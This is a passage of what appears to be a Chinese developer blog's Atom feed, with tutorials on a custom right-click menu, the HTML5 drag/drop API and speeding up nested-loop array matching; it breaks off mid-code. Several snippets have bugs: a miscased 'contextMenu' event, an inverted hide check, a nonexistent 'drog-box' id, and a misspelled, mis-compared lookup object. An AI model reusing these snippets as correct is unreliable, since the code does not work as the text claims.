      &lt;p&gt;众所周知，&lt;code&gt;React&lt;/code&gt; 是一个非常优秀的 &lt;code&gt;UI-Library&lt;/code&gt;，它将我们&lt;strong&gt;从事件驱动&lt;/strong&gt;带入了&lt;strong&gt;数据驱动&lt;/strong&gt;的大潮中。在 &lt;code&gt;React&lt;/code&gt; 中，一般通过修改 &lt;code&gt;state&lt;/code&gt; 和 &lt;code&gt;props&lt;/code&gt; 来更新组件。但是&lt;strong&gt;数据驱动&lt;/strong&gt;并不意味着我们就完全不需要操作 &lt;code&gt;DOM&lt;/code&gt; 了， &lt;code&gt;ref&lt;/code&gt; 就是 &lt;code&gt;React&lt;/code&gt; 为我们提供操作 &lt;code&gt;DOM&lt;/code&gt; 的一个方法。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>右键菜单</title>
    <link href="https://github.com/TheNightElf/2017/06/11/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/"/>
    <id>https://github.com/TheNightElf/2017/06/11/右键菜单/</id>
    <published>2017-06-11T06:17:09.000Z</published>
    <updated>2018-03-01T06:52:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>这几天写了一个<strong>自定义右键菜单</strong>的功能，在这里记录下吧。<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自定义右键菜单也算是一个很常见的功能了，一般大多数的网盘空间都会使用自定义右键菜单。</p><h4 id="实现右键菜单"><a href="#实现右键菜单" class="headerlink" title="实现右键菜单"></a>实现右键菜单</h4><p>这里假设我们有这样的一个 <code>HTML</code> 结构。<code>container</code> 是外部容器， <code>right-menu</code> 则是我们需要展示的右键菜单。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    .container &#123;</span></span><br><span class="line"><span class="undefined">        width: 800px;</span></span><br><span class="line"><span class="undefined">        height: 300px;</span></span><br><span class="line"><span class="undefined">        position: relative;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    .hide &#123;</span></span><br><span class="line"><span class="undefined">        display: none !important;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    .right-menu &#123;</span></span><br><span class="line"><span class="undefined">        width: 80px;</span></span><br><span class="line"><span class="undefined">        height: 120px;</span></span><br><span class="line"><span class="undefined">        position: absolute;</span></span><br><span class="line"><span class="undefined">        top: 0;</span></span><br><span class="line"><span class="undefined">        left: 0;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'container'</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 内容区域 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'content'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'content-item'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'content-item'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'content-item'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'right-menu hide'</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 右键菜单内容区域 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>想要使用自己的右键菜单我们必须先禁用浏览器自带的右键菜单，然后在当前鼠标位置展示我们自己的菜单。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 右键菜单事件</span></span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.querySelector(<span class="string">'.container'</span>);</span><br><span class="line">    menu = <span class="built_in">document</span>.querySelector(<span class="string">'.container .right-menu'</span>);</span><br><span class="line"></span><br><span class="line">container.addEventListener(<span class="string">'contextMenu'</span>, (e) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 禁用浏览器事件</span></span><br><span class="line">    e.preventDefault();</span><br><span class="line"></span><br><span class="line">    menu.classList.remove(<span class="string">'hide'</span>);</span><br><span class="line">    menu.style.left = e.target.offsetX + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.top = e.target.offsetY + <span class="string">'px'</span>;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐藏菜单</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!menu.classList.contains(<span class="string">'hide'</span>)) <span class="keyword">return</span>;</span><br><span class="line">    menu.classList.add(<span class="string">'hide'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>卧槽，没想到这次这么快就…</p><h4 id="补充点内容"><a href="#补充点内容" class="headerlink" title="补充点内容"></a>补充点内容</h4><p>上面写的只是最简单的一种情况——右键菜单在容器上触发。实际情况下，触发的元素不是在容器上，而是在容器的内容上。<br>也就是结构中的 <code>content-item</code> 上。这个时候右键菜单的位置就不能根据 <code>e.target.offsetX</code> 和 <code>e.target.offsetY</code> 来确定了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    menu.style.left = e.target.offsetX + <span class="built_in">parseInt</span>(e.target.parentNode.offsetLeft) +<span class="string">'px'</span>;</span><br><span class="line">    menu.style.top = e.target.offsetY + <span class="built_in">parseInt</span>(e.target.parentNode.offsetTop) + <span class="string">'px'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>到这里是真的没什么要补充的了，我还是想想下次写什么能写长一点把。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这几天写了一个&lt;strong&gt;自定义右键菜单&lt;/strong&gt;的功能，在这里记录下吧。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>拖拽功能</title>
    <link href="https://github.com/TheNightElf/2017/06/08/%E6%8B%96%E6%8B%BD%E5%8A%9F%E8%83%BD/"/>
    <id>https://github.com/TheNightElf/2017/06/08/拖拽功能/</id>
    <published>2017-06-08T02:06:56.000Z</published>
    <updated>2018-02-05T06:31:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>HTML5</code> 为我们提供了 <code>drag/drop</code> 拖拽功能的 <code>api</code>，极大的简化了我们在开发拖拽功能时的代码量。<br><a id="more"></a></p><h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><p>所有的拖拽事件必须作用于可拖拽的元素上(<code>draggable=&#39;true&#39;</code>)，否则将无法触发拖拽事件。</p><p><strong>drag</strong><br>作用于：拖拽元素。<br>说明：当元素或者选择的文本被拖动时触发 <code>drag</code> 事件 (频率：每几百毫秒触发一次)。</p><p><strong>dragstart</strong><br>作用于：拖拽元素。<br>说明：当用户开始拖动一个元素或者一个选择文本的时候 <code>dragstart</code> 事件就会触发(仅触发一次)。</p><p><strong>dragover</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽到一个有效的放置目标上时，触发 <code>dragover</code> 事件(频率：每几百毫秒触发一次)。</p><p><strong>dragenter</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽进入到一个有效的放置目标上时，触发 <code>dragenter</code> 事件(仅触发一次)。</p><p><strong>dragleave</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽离开一个有效的放置目标上时，触发 <code>dragleave</code> 事件(仅触发一次)。</p><p><strong>dragend</strong><br>作用于：拖拽元素。<br>说明：当一个拖拽的操作被取消(弹起鼠标/按下 <code>space</code> 键)时，触发 <code>dragend</code> 事件(仅触发一次)。</p><p><strong>drop</strong><br>作用于：目标元素。<br>说明：当一个元素或是选中的文字被拖拽释放到一个 <code>有效的</code> 释放目标位置时，<code>drop</code> 事件被抛出(仅触发一次)。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">""</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        .drag-box &#123;</span></span><br><span class="line"><span class="undefined">            width: 100px;</span></span><br><span class="line"><span class="undefined">            height: 100px;</span></span><br><span class="line"><span class="undefined">            background-color: lightcoral;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        .drop-box &#123;</span></span><br><span class="line"><span class="undefined">            width: 500px;</span></span><br><span class="line"><span class="undefined">            height: 500px;</span></span><br><span class="line"><span class="undefined">            background-color: lightblue;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"drag-box"</span> <span class="attr">id</span>=<span class="string">"drag-box"</span> <span class="attr">draggable</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"drop-box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">'drag-box'</span>),</span></span><br><span class="line"><span class="javascript">            tar = <span class="built_in">document</span>.getElementById(<span class="string">'drog-box'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 元素触发拖拽</span></span></span><br><span class="line"><span class="javascript">        el.ondrag = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 开始拖拽</span></span></span><br><span class="line"><span class="javascript">        el.ondragstart = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 拖拽结束</span></span></span><br><span class="line"><span class="javascript">        el.ondragend = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 拖拽至目标元素上</span></span></span><br><span class="line"><span class="javascript">        tar.ondragover = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            e.preventDefault();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 拖拽进入目标元素</span></span></span><br><span class="line"><span class="javascript">        tar.ondragenter = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 拖拽离开目标元素</span></span></span><br><span class="line"><span class="javascript">        tar.ondragleave = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 拖拽释放</span></span></span><br><span class="line"><span class="javascript">        tar.ondrop = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ...</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="传递消息"><a href="#传递消息" class="headerlink" title="传递消息"></a>传递消息</h3><p>在拖拽的整个周期中，我们都可以通过 <code>dataTransfer</code> 来传递数据。但是数据流通必须在 <code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在开始拖拽的时候设置数据</span></span><br><span class="line">el.ondragstart = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置 effectAllowed 为 'move'</span></span><br><span class="line">    e.dataTransfer.effectAllowed = <span class="string">'move'</span>;</span><br><span class="line">    e.dataTransfer.setData(<span class="string">'msg'</span>, <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">name</span>: <span class="string">'Carl'</span>&#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在拖拽结束的时候清除数据</span></span><br><span class="line">el.ondragend = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e.dataTransfer.clearData(<span class="string">'msg'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 再拖拽释放的时候获取数据</span></span><br><span class="line">tar.ondrop = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 必须设置 dropEffect 为 'move'，否则无法通过 getData 获取数据</span></span><br><span class="line">    e.dataTransfer.dropEffect = <span class="string">'move'</span>;</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="built_in">JSON</span>.parse(e.dataTransfer.getData(<span class="string">'msg'</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(msg.name); <span class="comment">// -&gt; 'Carl'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常见的-dropEffect-与-effectAllowed-值"><a href="#常见的-dropEffect-与-effectAllowed-值" class="headerlink" title="常见的 dropEffect 与 effectAllowed 值"></a>常见的 <code>dropEffect</code> 与 <code>effectAllowed</code> 值</h3><p><strong>常见的 <code>dropEffect</code> 的值</strong></p><ul><li>copy：复制到新的位置</li><li>move：移动到新的位置</li><li>link: 建立一个源位置到新位置的链接</li><li>none：禁止任何操作</li></ul><p><strong>常见的 <code>effectAllowed</code> 值</strong></p><ul><li>copy: 复制到新的位置</li><li>move:移动到新的位置</li><li>link:建立一个源位置到新位置的链接</li><li>copyLink: 允许复制或者链接</li><li>copyMove: 允许复制或者移动</li><li>linkMove: 允许链接或者移动</li><li>all: 允许所有的操作</li><li>none: 禁止所有操作</li><li>uninitialized: 缺省值(默认值), 相当于 <code>all</code></li></ul><p>细心的你可能会发现 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值类型上根本不匹配，那么我上面说的 <strong><code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输</strong> 岂不是根本就对应不上了？<br>文档上对此的解释是：<code>dropEffect</code> 与 <code>effectAllowed</code> 的值，<strong>分配任何其他值时不会有任何影响并且保留旧值</strong>。意思就是多次的修改 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值并不会影响之前设置的值，类似于 <code>addEventListener</code> 的用法(关于这点我并没有具体的实验过，感兴趣的可以自己试下)，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer" target="_blank" rel="noopener">文档地址</a>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>说的再多可能都没有自己写一个 <code>demo</code> 理解的快，关于 <code>drag/drop</code> 常用的一些东西已经在上面列出了。<code>dropEffect</code> 对象中还有一些别的方法，不过引用情况并不是特别多，所以这里就不再一一讲解了，感兴趣的可以看下<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer" target="_blank" rel="noopener">文档</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;HTML5&lt;/code&gt; 为我们提供了 &lt;code&gt;drag/drop&lt;/code&gt; 拖拽功能的 &lt;code&gt;api&lt;/code&gt;，极大的简化了我们在开发拖拽功能时的代码量。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>优化双重循环</title>
    <link href="https://github.com/TheNightElf/2017/05/26/%E4%BC%98%E5%8C%96%E5%8F%8C%E9%87%8D%E5%BE%AA%E7%8E%AF/"/>
    <id>https://github.com/TheNightElf/2017/05/26/优化双重循环/</id>
    <published>2017-05-26T09:29:21.000Z</published>
    <updated>2018-02-02T10:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>实际开发中或者部分的面试题中偶尔会遇到 <code>双重循环</code> 的问题，直接使用 <code>循环嵌套</code> 的效率又太低。<br><a id="more"></a></p><h3 id="场景再现"><a href="#场景再现" class="headerlink" title="场景再现"></a>场景再现</h3><p>下面有两个数组，用最优的方式得出其中 <code>id</code> 相同的项。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [&#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'aaa'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'bbb'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    name: <span class="string">'ccc'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">4</span>,</span><br><span class="line">    name: <span class="string">'ddd'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">5</span>,</span><br><span class="line">    name: <span class="string">'eee'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">6</span>,</span><br><span class="line">    name: <span class="string">'fff'</span></span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2 = [&#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'aaa'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">7</span>,</span><br><span class="line">    name: <span class="string">'ggg'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">12</span>,</span><br><span class="line">    name: <span class="string">'lll'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">10</span>,</span><br><span class="line">    name: <span class="string">'jjj'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">5</span>,</span><br><span class="line">    name: <span class="string">'eee'</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    id: <span class="number">9</span>,</span><br><span class="line">    name: <span class="string">'iii'</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure></p><h4 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h4><p><strong>嵌套循环</strong><br>通过双重 <code>for/forEach循环</code> 对比两个数组中的每一项，求出 <code>id</code> 相同的项。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr2.length; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr1[i].id === arr2[j].id) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法应该是每个会编程的人都会使用的一种方法，而且也是最简单的方法。如果这两个数组，每个数组各有 <code>9项</code>，那么为了得出结果，我们需要遍历 <code>9 * 9</code> 次，复杂度为 <code>81</code> 次。</p><p><strong>降低空间指数</strong><br>通过遍历数组结合字典查询降低空间指数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [maxArr, minArr] = arr1.length &gt; arr2.length ? [arr1, arr2] : [arr2, arr1];</span><br><span class="line"><span class="keyword">let</span> tempObj = &#123;&#125;, result = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里我们可以得出遍历 maxArr 所需的复杂度 m</span></span><br><span class="line"><span class="comment">// 一般情况下，我们使用长度最长的数组作为父本</span></span><br><span class="line">maxArr.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    tempObj[item.id] = item</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里我们可以得出遍历 maxArr 所需的复杂度 n</span></span><br><span class="line">minArr.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(temoObj[item.id] === item.id) &#123;</span><br><span class="line">        result.push(item)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果集 result 就是 id 相同的项</span></span><br><span class="line"><span class="comment">// 复杂度为 m + n</span></span><br></pre></td></tr></table></figure><p><strong>使用es6语法一</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> spreadArr = [...arr1, ...arr2];</span><br><span class="line"><span class="keyword">let</span> tempObj = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历 spreadArr 的复杂度为 arr1 的复杂度 m + arr2 的复杂度 n</span></span><br><span class="line">spreadArr.map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 tempObj 中没有这一项</span></span><br><span class="line">    <span class="keyword">if</span>(!tempObj[item.id]) &#123;</span><br><span class="line">        <span class="keyword">return</span> 